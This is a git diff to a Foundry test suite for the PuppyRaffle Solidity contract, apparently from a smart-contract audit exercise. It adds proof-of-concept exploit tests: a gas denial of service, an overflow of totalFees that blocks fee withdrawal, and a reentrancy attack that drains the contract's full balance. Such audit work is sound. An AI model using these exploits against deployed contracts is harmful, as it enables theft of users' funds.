@@ -214,6 +214,7 @@ contract PuppyRaffleTest is Test {
         assertEq(address(feeAddress).balance, expectedPrizeAmount);
     }
 
+    //by me
     function test_DoS() public {
         vm.txGasPrice(1);
         uint256 playerNum = 100;
@@ -250,6 +251,48 @@ contract PuppyRaffleTest is Test {
 
     }
 
+    //by me
+    function testTotalFeesOverflow() public {
+        // Finish a raffle with less players collect the starting fee
+        address[] memory players = new address[](4);
+        players[0] = vm.addr(110);
+        players[1] = vm.addr(120);
+        players[2] = vm.addr(130);
+        players[3] = vm.addr(140);
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+        puppyRaffle.selectWinner();
+        uint256 startingTotalFees = puppyRaffle.totalFees();
+
+        //We then have 89 players enter the raffle, more than the starting raffle.
+        uint256 playersNum = 89;
+        address[] memory players2 = new address[](playersNum);
+        for (uint256 i = 0; i < playersNum; i++) {
+            players2[i] = vm.addr(i + 200); //to get unique address
+        }
+        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players2);
+        // We end the raffle
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        // And here is where the issue occurs
+        // We will now have fewer fees even though we just finished a second raffle
+        puppyRaffle.selectWinner();
+
+        uint256 endingTotalFees = puppyRaffle.totalFees();
+        console.log("starting total fees: ", startingTotalFees);
+        console.log("ending total fees: ", endingTotalFees);
+        assert(endingTotalFees < startingTotalFees);
+
+        // We are also unable to withdraw any fees because of the require check
+        vm.prank(puppyRaffle.feeAddress());
+        vm.expectRevert("PuppyRaffle: There are currently players active!");
+        puppyRaffle.withdrawFees();
+
+    }
+
     // function test_reentrancyRefund() public playerEntered {
 
     //     address[] memory players = new address[](4);
@@ -281,23 +324,25 @@ contract PuppyRaffleTest is Test {
 
         
     // }
-
+    //by me
     function testReentrance() public playersEntered {
-    ReentrancyAttacker attacker = new ReentrancyAttacker(address(puppyRaffle));
-    vm.deal(address(attacker), 1e18);
-    uint256 startingAttackerBalance = address(attacker).balance;
-    uint256 startingContractBalance = address(puppyRaffle).balance;
+        ReentrancyAttacker attacker = new ReentrancyAttacker(address(puppyRaffle));
+        vm.deal(address(attacker), 1e18);
+        uint256 startingAttackerBalance = address(attacker).balance;
+        uint256 startingContractBalance = address(puppyRaffle).balance;
 
-    attacker.attack();
+        attacker.attack();
 
-    uint256 endingAttackerBalance = address(attacker).balance;
-    uint256 endingContractBalance = address(puppyRaffle).balance;
-    assertEq(endingAttackerBalance, startingAttackerBalance + startingContractBalance);
-    assertEq(endingContractBalance, 0);
+        uint256 endingAttackerBalance = address(attacker).balance;
+        uint256 endingContractBalance = address(puppyRaffle).balance;
+        assertEq(endingAttackerBalance, startingAttackerBalance + startingContractBalance);
+        assertEq(endingContractBalance, 0);
+    }
+
+
 }
-}
 
-
+//by me
 contract ReentrancyAttacker {
     PuppyRaffle puppyRaffle;
     uint256 entranceFee;
